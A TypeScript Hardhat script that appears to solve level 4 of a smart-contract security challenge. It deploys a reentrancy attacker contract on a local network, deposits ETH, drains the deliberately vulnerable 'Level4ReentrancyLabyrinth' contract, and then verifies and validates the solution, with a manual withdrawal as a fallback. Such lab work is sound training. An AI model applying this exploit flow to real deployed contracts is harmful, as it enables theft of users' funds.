// scripts/debug-level4-limited.ts
// Run with: npx hardhat run scripts/debug-level4-limited.ts --network localhost

import hre from "hardhat";
import { getAddress, parseEther, formatEther, Address } from "viem";
import fs from 'fs';
import path from 'path';
import dotenv from 'dotenv';
dotenv.config();

// Helper function to ensure addresses are properly formatted
function formatAddress(address: string): Address {
  return getAddress(address) as Address;
}

async function main() {
  try {
    console.log("🔍 DEBUGGING LEVEL 4 REENTRANCY ATTACK (LIMITED RECURSION) 🔍");
    console.log("==========================================================");
    
    // Get wallet and public client
    const [wallet] = await hre.viem.getWalletClients();
    const walletAddress = wallet.account.address;
    const publicClient = await hre.viem.getPublicClient();
    
    console.log(`Using account: ${getAddress(walletAddress)}`);
    
    // Load deployment addresses
    const deploymentPath = path.join(__dirname, '../deployed-addresses.json');
    let deploymentAddresses: any = {};
    
    if (fs.existsSync(deploymentPath)) {
      try {
        const deploymentData = fs.readFileSync(deploymentPath, 'utf8');
        deploymentAddresses = JSON.parse(deploymentData);
      } catch (error) {
        console.warn("Could not parse deployment addresses file.");
      }
    }
    
    // Get contract addresses
    const LEVEL4_CONTRACT_ADDRESS = process.env.LEVEL4_CONTRACT_ADDRESS || 
                                   deploymentAddresses.Level4ReentrancyLabyrinth;
    
    if (!LEVEL4_CONTRACT_ADDRESS) {
      throw new Error("Level4 contract address not found");
    }
    
    const level4Address = formatAddress(LEVEL4_CONTRACT_ADDRESS);
    console.log(`Level4 Contract: ${level4Address}`);
    
    // Get the Level4 contract
    const level4Contract = await hre.viem.getContractAt("Level4ReentrancyLabyrinth", level4Address);
    
    // Step 1: Deploy a new attacker contract (fixed implementation)
    console.log("\nDeploying new ReentrancyAttacker contract with limited recursion...");
    await hre.run('compile');
    
    const attackerContract = await hre.viem.deployContract("ReentrancyAttacker", [level4Address]);
    const attackerAddress = attackerContract.address;
    console.log(`ReentrancyAttacker deployed to: ${attackerAddress}`);
    
    // Save the address for future reference
    deploymentAddresses.ReentrancyAttacker = attackerAddress;
    fs.writeFileSync(deploymentPath, JSON.stringify(deploymentAddresses, null, 2));
    
    // Step 2: Check initial balances
    const level4Balance = await publicClient.getBalance({ address: level4Address });
    const attackerBalance = await publicClient.getBalance({ address: attackerAddress });
    const attackerStoredBalance = await level4Contract.read.balances([attackerAddress]) as bigint;
    const totalDeposits = await level4Contract.read.totalDeposits() as bigint;
    
    console.log("\nInitial balances:");
    console.log(`Level4 contract: ${formatEther(level4Balance)} ETH`);
    console.log(`Total deposits in Level4: ${formatEther(totalDeposits)} ETH`);
    console.log(`Attacker contract: ${formatEther(attackerBalance)} ETH`);
    console.log(`Attacker's balance in Level4: ${formatEther(attackerStoredBalance)} ETH`);
    
    // Step 3: Setup the attack
    console.log("\nSetting up the attack...");
    const depositAmount = parseEther("1.0");
    console.log(`Depositing: ${formatEther(depositAmount)} ETH`);
    
    const setupTx = await attackerContract.write.setup([], { value: depositAmount });
    await publicClient.waitForTransactionReceipt({ hash: setupTx });
    
    // Step 4: Check balances after setup
    const balancesAfterSetup = await attackerContract.read.getBalances() as bigint[];
    console.log(`Balances after setup: ${balancesAfterSetup}`);
    const level4BalanceAfterSetup = await publicClient.getBalance({ address: level4Address });
    const totalDepositsAfterSetup = await level4Contract.read.totalDeposits() as bigint;
    
    console.log("\nBalances after setup:");
    console.log(`Level4 contract: ${formatEther(level4BalanceAfterSetup)} ETH`);
    console.log(`Total deposits in Level4: ${formatEther(totalDepositsAfterSetup)} ETH`);
    console.log(`Attacker contract: ${formatEther(balancesAfterSetup[0])} ETH`);
    console.log(`Attacker's balance in Level4: ${formatEther(balancesAfterSetup[2])} ETH`);
    console.log(`Withdrawal amount per call: ${formatEther(balancesAfterSetup[2] / BigInt(2))} ETH`);
    
    if (balancesAfterSetup[2] === 0n) {
      throw new Error("Setup failed: No balance recorded in Level4 contract");
    }
    
    // Step 5: Execute the exploit
    console.log("\nExecuting the reentrancy exploit with limited recursion...");
    console.log("This will make multiple smaller withdrawals to avoid gas issues");
    
    try {
      const exploitTx = await attackerContract.write.exploit();
      const receipt = await publicClient.waitForTransactionReceipt({ hash: exploitTx });
      
      console.log(`Exploit transaction status: ${receipt.status}`);
      console.log(`Gas used: ${receipt.gasUsed}`);
      
      // Step 6: Check balances after exploit
      const balancesAfterExploit = await attackerContract.read.getBalances() as bigint[];
      
      console.log("\nBalances after exploit:");
      console.log(`Attacker contract: ${formatEther(balancesAfterExploit[0])} ETH`);
      console.log(`Level4 contract: ${formatEther(balancesAfterExploit[1])} ETH`);
      console.log(`Attacker's balance in Level4: ${formatEther(balancesAfterExploit[2])} ETH`);
      console.log(`Total deposits in Level4: ${formatEther(balancesAfterExploit[3])} ETH`);
      
      // Step 7: Check if exploit was successful
      if (balancesAfterExploit[0] > 0n) {
        console.log(`\n✅ Exploit successful! Attacker contract now has ${formatEther(balancesAfterExploit[0])} ETH`);
        
        // Step 8: Verify the exploit with the contract
        console.log("\nVerifying the exploit with checkExploit...");
        
        try {
          const checkExploitTx = await level4Contract.write.checkExploit([attackerAddress]);
          await publicClient.waitForTransactionReceipt({ hash: checkExploitTx });
          
          const exploitSuccessful = await level4Contract.read.exploitSuccessful();
          console.log(`Contract confirms exploit successful: ${exploitSuccessful}`);
          
          if (exploitSuccessful) {
            // Step 9: Validate the solution
            console.log("\nMaking a deposit to test secure withdrawal...");
            const depositTx = await level4Contract.write.deposit([], {
              value: parseEther("0.1")
            });
            await publicClient.waitForTransactionReceipt({ hash: depositTx });
            
            console.log("Validating the solution...");
            const validateTx = await level4Contract.write.validateSolution();
            await publicClient.waitForTransactionReceipt({ hash: validateTx });
            
            console.log("\n🎮 LEVEL 4 COMPLETED SUCCESSFULLY! 🎮");
          }
        } catch (error: any) {
          console.error("\n❌ Error during exploit verification:", error.message);
          console.log("\nLet's try to withdraw our funds to see if we actually got any ETH...");
          
          const withdrawTx = await attackerContract.write.withdraw();
          await publicClient.waitForTransactionReceipt({ hash: withdrawTx });
          
          const finalAttackerBalance = await publicClient.getBalance({ address: attackerAddress });
          console.log(`Final attacker contract balance: ${formatEther(finalAttackerBalance)} ETH`);
        }
      } else {
        console.log("\n❌ Exploit failed. No funds were drained from the contract.");
      }
    } catch (error: any) {
      console.error("\n❌ Error during exploit:", error.message);
      // Try one more approach - manually call the contract a few times
      console.log("\nLet's try a manual approach instead of the automated exploit...");
      
      // Get current balance
      const currentBalance = await level4Contract.read.balances([attackerAddress]) as bigint;
      console.log(`Current balance in Level4: ${formatEther(currentBalance)} ETH`);
      
      // Try to withdraw a small amount manually
      const smallAmount = currentBalance / BigInt(10); // Just 10% of our balance
      
      if (smallAmount > 0n) {
        console.log(`Manually withdrawing ${formatEther(smallAmount)} ETH...`);
        
        try {
          const manualWithdrawTx = await level4Contract.write.vulnerableWithdraw([smallAmount], {
            account: wallet.account,
            gas: BigInt(500000) // Set higher gas limit
          });
          
          await publicClient.waitForTransactionReceipt({ hash: manualWithdrawTx });
          console.log("Manual withdrawal successful");
          
          // Check balances after manual withdrawal
          const balancesAfterManual = await attackerContract.read.getBalances() as bigint[];
          console.log(`Attacker contract balance: ${formatEther(balancesAfterManual[0])} ETH`);
          
          // Try to verify exploit
          console.log("\nVerifying the exploit with checkExploit...");
          try {
            const checkExploitTx = await level4Contract.write.checkExploit([attackerAddress]);
            await publicClient.waitForTransactionReceipt({ hash: checkExploitTx });
            
            const exploitSuccessful = await level4Contract.read.exploitSuccessful();
            console.log(`Contract confirms exploit successful: ${exploitSuccessful}`);
          } catch (error: any) {
            console.error("Verification failed:", error.message);
          }
        } catch (error: any) {
          console.error("Manual withdrawal failed:", error.message);
        }
      }
    }
    
  } catch (error: any) {
    console.error(`\n❌ Error: ${error.message}`);
    // If there's more error details, log them
    if (error.cause) console.error("Cause:", error.cause);
    if (error.data) console.error("Data:", error.data);
    process.exit(1);
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });